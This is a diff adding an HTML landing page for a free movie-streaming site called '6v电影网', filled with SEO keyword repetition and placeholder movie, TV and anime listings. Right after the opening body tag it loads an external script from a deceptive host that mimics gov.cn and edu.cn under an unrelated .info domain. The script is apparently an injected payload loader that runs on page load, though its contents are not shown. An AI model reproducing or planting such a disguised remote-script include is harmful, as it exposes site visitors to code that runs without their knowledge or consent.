@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>6v电影网 - 海量高清影视在线观看平台</title>
+<meta name="description" content="6v电影网（https://6vdianyingwang-h5）提供最新高清电影、热播电视剧、热门动漫、综艺娱乐免费在线观看，海量正版资源，畅享视听盛宴。">
+<meta name="keywords" content="6v电影网,6vdianyingwang-h5,高清电影,在线观看,热播电视剧,动漫,综艺">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://6vdianyingwang-h5">
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    :root{
+        --primary:#e63950;
+        --primary-dark:#c6283f;
+        --accent:#ffb703;
+        --light:#fff8f0;
+        --white:#ffffff;
+        --gray:#666;
+        --dark:#2b2b2b;
+        --shadow:0 4px 20px rgba(0,0,0,.08);
+    }
+    html{ scroll-behavior:smooth; }
+    body{
+        font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+        background:var(--light);
+        color:var(--dark);
+        line-height:1.7;
+    }
+    a{ text-decoration:none; color:var(--primary); transition:.25s; }
+    a:hover{ color:var(--primary-dark); }
+    .container{ max-width:1160px; margin:0 auto; padding:0 1rem; }
+
+    /* ===== 顶部 ===== */
+    .topbar{
+        background:var(--white);
+        box-shadow:var(--shadow);
+        position:sticky; top:0; z-index:999;
+    }
+    .topbar-inner{
+        display:flex; align-items:center; justify-content:space-between;
+        height:70px;
+    }
+    .brand{
+        font-size:1.9rem; font-weight:900; letter-spacing:1px;
+        color:var(--primary);
+        display:flex; align-items:center; gap:.5rem;
+    }
+    .brand span.dot{
+        display:inline-block; width:12px; height:12px; border-radius:50%;
+        background:var(--accent);
+    }
+    .url-tag{
+        font-size:.8rem; color:var(--gray); margin-top:2px;
+    }
+    .menu{ display:flex; gap:1.2rem; }
+    .menu a{
+        color:var(--dark); font-weight:600; font-size:1rem;
+        padding:.4rem .2rem; border-bottom:2px solid transparent;
+    }
+    .menu a:hover{ color:var(--primary); border-bottom-color:var(--primary); }
+
+    /* ===== 横幅 ===== */
+    .banner{
+        background:linear-gradient(120deg,#e63950 0%,#ff6b6b 55%,#ffb703 100%);
+        color:#fff; padding:4rem 1rem; text-align:center;
+        clip-path:polygon(0 0,100% 0,100% 88%,0 100%);
+    }
+    .banner h1{ font-size:2.6rem; font-weight:900; margin-bottom:1rem; text-shadow:0 2px 8px rgba(0,0,0,.15); }
+    .banner p{ font-size:1.15rem; opacity:.95; }
+
+    /* ===== 通用区块 ===== */
+    section{ padding:3.5rem 0; }
+    .sec-title{
+        display:flex; align-items:center; gap:.8rem;
+        font-size:1.7rem; font-weight:800; color:var(--dark);
+        margin-bottom:2rem;
+    }
+    .sec-title .bar{
+        width:6px; height:28px; border-radius:3px;
+        background:var(--primary); display:inline-block;
+    }
+    .sec-desc{ color:var(--gray); margin-bottom:1.5rem; }
+
+    /* ===== 卡片网格 ===== */
+    .grid{
+        display:grid; grid-template-columns:repeat(auto-fill,minmax(210px,1fr)); gap:1.5rem;
+    }
+    .card{
+        background:var(--white); border-radius:14px; overflow:hidden;
+        box-shadow:var(--shadow); transition:.3s;
+    }
+    .card:hover{ transform:translateY(-6px); box-shadow:0 12px 30px rgba(0,0,0,.14); }
+    .poster{
+        height:270px; display:flex; align-items:center; justify-content:center;
+        color:#fff; font-size:1rem; font-weight:600;
+        background:linear-gradient(135deg,#ff9a9e,#fad0c4);
+    }
+    .card:nth-child(2) .poster{ background:linear-gradient(135deg,#a18cd1,#fbc2eb); }
+    .card:nth-child(3) .poster{ background:linear-gradient(135deg,#84fab0,#8fd3f4); }
+    .card:nth-child(4) .poster{ background:linear-gradient(135deg,#ffecd2,#fcb69f); }
+    .card-info{ padding:1rem 1.1rem; }
+    .card-info h3{ font-size:1.05rem; color:var(--dark); margin-bottom:.4rem; }
+    .card-info p{ font-size:.85rem; color:var(--gray); }
+
+    /* ===== 频道 ===== */
+    .channels{
+        display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:1rem;
+    }
+    .channel{
+        background:var(--white); border-radius:12px; padding:1.5rem 1rem;
+        text-align:center; box-shadow:var(--shadow); transition:.3s;
+    }
+    .channel:hover{ background:var(--primary); color:#fff; transform:scale(1.03); }
+    .channel .ico{ font-size:2rem; margin-bottom:.5rem; }
+    .channel:hover .ico{ color:#fff; }
+    .channel .ico{ color:var(--primary); }
+    .channel p{ font-weight:700; }
+
+    /* ===== 排行列表 ===== */
+    .ranking{ background:#fff; border-radius:14px; box-shadow:var(--shadow); overflow:hidden; }
+    .rank-item{
+        display:flex; align-items:center; gap:1rem;
+        padding:1rem 1.2rem; border-bottom:1px solid #f0f0f0;
+    }
+    .rank-item:last-child{ border-bottom:none; }
+    .rank-num{
+        width:32px; height:32px; border-radius:8px; flex-shrink:0;
+        background:var(--light); color:var(--primary); font-weight:900;
+        display:flex; align-items:center; justify-content:center;
+    }
+    .rank-item:nth-child(-n+3) .rank-num{ background:var(--primary); color:#fff; }
+    .rank-text{ font-weight:600; }
+    .rank-text small{ display:block; color:var(--gray); font-weight:400; font-size:.8rem; }
+
+    /* ===== 页脚 ===== */
+    footer{
+        background:var(--dark); color:#bbb; padding:2.5rem 1rem 1.5rem;
+        text-align:center;
+    }
+    footer .brand{ color:#fff; justify-content:center; }
+    footer p{ margin:.4rem 0; font-size:.9rem; }
+    footer a{ color:var(--accent); }
+
+    /* ===== 移动端 ===== */
+    @media(max-width:768px){
+        .topbar-inner{ height:auto; flex-direction:column; padding:1rem 0; gap:.5rem; }
+        .menu{ flex-wrap:wrap; justify-content:center; gap:.6rem; }
+        .banner{ padding:3rem 1rem; }
+        .banner h1{ font-size:1.8rem; }
+        .banner p{ font-size:1rem; }
+        section{ padding:2.5rem 0; }
+        .sec-title{ font-size:1.4rem; }
+        .grid{ grid-template-columns:repeat(2,1fr); gap:1rem; }
+        .poster{ height:200px; }
+    }
+    @media(max-width:420px){
+        .banner h1{ font-size:1.5rem; }
+        .grid{ grid-template-columns:1fr; }
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部导航 -->
+<div class="topbar">
+    <div class="container topbar-inner">
+        <div>
+            <div class="brand"><span class="dot"></span>6v电影网</div>
+            <div class="url-tag">网址：https://6vdianyingwang-h5</div>
+        </div>
+        <nav class="menu">
+            <a href="#home">首页</a>
+            <a href="#movie">电影</a>
+            <a href="#tv">电视剧</a>
+            <a href="#anime">动漫</a>
+            <a href="#rank">排行榜</a>
+            <a href="#about">关于</a>
+        </nav>
+    </div>
+</div>
+
+<!-- 横幅 -->
+<header id="home" class="banner">
+    <h1>欢迎来到 6v电影网</h1>
+    <p>https://6vdianyingwang-h5 —— 海量高清影视，免费在线观看</p>
+</header>
+
+<main class="container">
+
+    <!-- 频道导览 -->
+    <section id="channels">
+        <div class="sec-title"><span class="bar"></span>精选频道</div>
+        <p class="sec-desc">6v电影网为你提供丰富的影视分类，一键直达心仪内容。</p>
+        <div class="channels">
+            <div class="channel"><div class="ico">🎬</div><p>最新电影</p></div>
+            <div class="channel"><div class="ico">📺</div><p>热播剧集</p></div>
+            <div class="channel"><div class="ico">🌟</div><p>人气动漫</p></div>
+            <div class="channel"><div class="ico">🎤</div><p>综艺娱乐</p></div>
+            <div class="channel"><div class="ico">🔥</div><p>热门榜单</p></div>
+        </div>
+    </section>
+
+    <!-- 电影 -->
+    <section id="movie">
+        <div class="sec-title"><span class="bar"></span>最新电影</div>
+        <p class="sec-desc">6v电影网每日更新院线大片，高清流畅，畅快观看。</p>
+        <div class="grid">
+            <div class="card"><div class="poster">电影海报</div><div class="card-info"><h3>电影名称 1</h3><p>动作 · 2024 · 6v电影网</p></div></div>
+            <div class="card"><div class="poster">电影海报</div><div class="card-info"><h3>电影名称 2</h3><p>科幻 · 2024 · 6v电影网</p></div></div>
+            <div class="card"><div class="poster">电影海报</div><div class="card-info"><h3>电影名称 3</h3><p>喜剧 · 2024 · 6v电影网</p></div></div>
+            <div class="card"><div class="poster">电影海报</div><div class="card-info"><h3>电影名称 4</h3><p>爱情 · 2024 · 6v电影网</p></div></div>
+        </div>
+    </section>
+
+    <!-- 电视剧 -->
+    <section id="tv">
+        <div class="sec-title"><span class="bar"></span>热播电视剧</div>
+        <p class="sec-desc">在6v电影网追剧，国产剧、韩剧、美剧一网打尽。</p>
+        <div class="grid">
+            <div class="card"><div class="poster">剧集封面</div><div class="card-info"><h3>电视剧名称 1</h3><p>剧情 · 40集 · 6v电影网</p></div></div>
+            <div class="card"><div class="poster">剧集封面</div><div class="card-info"><h3>电视剧名称 2</h3><p>悬疑 · 30集 · 6v电影网</p></div></div>
+            <div class="card"><div class="poster">剧集封面</div><div class="card-info"><h3>电视剧名称 3</h3><p>古装 · 50集 · 6v电影网</p></div></div>
+        </div>
+    </section>
+
+    <!-- 动漫 -->
+    <section id="anime">
+        <div class="sec-title"><span class="bar"></span>人气动漫</div>
+        <p class="sec-desc">6v电影网精选日本动漫、国产动漫，每周同步更新。</p>
+        <div class="grid">
+            <div class="card"><div class="poster">动漫封面</div><div class="card-info"><h3>动漫名称 1</h3><p>热血 · 连载 · 6v电影网</p></div></div>
+            <div class="card"><div class="poster">动漫封面</div><div class="card-info"><h3>动漫名称 2</h3><p>奇幻 · 连载 · 6v电影网</p></div></div>
+            <div class="card"><div class="poster">动漫封面</div><div class="card-info"><h3>动漫名称 3</h3><p>治愈 · 连载 · 6v电影网</p></div></div>
+        </div>
+    </section>
+
+    <!-- 排行榜 -->
+    <section id="rank">
+        <div class="sec-title"><span class="bar"></span>热门排行榜</div>
+        <p class="sec-desc">6v电影网实时统计，看看大家都在看什么。</p>
+        <div class="ranking">
+            <div class="rank-item"><span class="rank-num">1</span><div class="rank-text">热播影视作品一<small>动作 / 6v电影网 高分推荐</small></div></div>
+            <div class="rank-item"><span class="rank-num">2</span><div class="rank-text">热播影视作品二<small>剧情 / 6v电影网 高分推荐</small></div></div>
+            <div class="rank-item"><span class="rank-num">3</span><div class="rank-text">热播影视作品三<small>科幻 / 6v电影网 高分推荐</small></div></div>
+            <div class="rank-item"><span class="rank-num">4</span><div class="rank-text">热播影视作品四<small>喜剧 / 6v电影网 高分推荐</small></div></div>
+            <div class="rank-item"><span class="rank-num">5</span><div class="rank-text">热播影视作品五<small>悬疑 / 6v电影网 高分推荐</small></div></div>
+        </div>
+    </section>
+
+    <!-- 关于 -->
+    <section id="about">
+        <div class="sec-title"><span class="bar"></span>关于 6v电影网</div>
+        <p class="sec-desc">网站名称：<strong>6v电影网</strong>　网站网址：<strong>https://6vdianyingwang-h5</strong></p>
+        <p>6v电影网（6vdianyingwang-h5）是一个专注于提供高清影视资源的在线观看平台，涵盖最新电影、热播电视剧、人气动漫、综艺娱乐等丰富内容。我们致力于为影迷打造流畅、清晰、便捷的观影体验。</p>
+        <p style="margin-top:1rem;color:var(--gray);">核心关键词：6v电影网、6vdianyingwang-h5、高清电影、在线观看、热播电视剧、动漫综艺。</p>
+    </section>
+
+</main>
+
+<!-- 页脚 -->
+<footer>
+    <div class="brand"><span class="dot"></span>6v电影网</div>
+    <p>网站网址：https://6vdianyingwang-h5</p>
+    <p>© 2024 6v电影网（6vdianyingwang-h5）保留所有权利。</p>
+    <p><a href="#">网站地图</a> · <a href="#">免责声明</a> · <a href="#">联系我们</a></p>
+</footer>
+
+</body>
+</html>
